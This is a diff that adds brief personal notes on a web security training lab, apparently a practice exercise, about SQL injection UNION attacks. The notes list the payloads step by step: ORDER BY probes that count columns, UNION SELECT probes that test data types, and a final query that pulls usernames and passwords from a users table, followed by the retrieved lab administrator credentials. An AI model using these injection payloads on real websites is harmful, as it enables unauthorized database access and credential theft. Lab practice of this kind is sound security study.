@@ -1,0 +1,27 @@
+Lab: SQL injection UNION attack, retrieving data from other tables
+
+GOAL: output user and password to login using user table
+
+
+Analysis
+
+determine number of column
+'order by 1--  ok
+'order by 2--  ok
+'order by 3--  nternal server error
+so number of column = 3-1 = 2
+
+
+determine data type of the column
+select a,b from products where category = Lifestyle
+
+'union select null,null--  ok
+'union select 'a',null--  ok
+'union select 'a','a'--  ok
+so here both column return the string type value
+
+'union select username,password from users-- ok return the user and pass
+administrator
+8m9hdf39fxvh9o1pdiym
+
+Solved
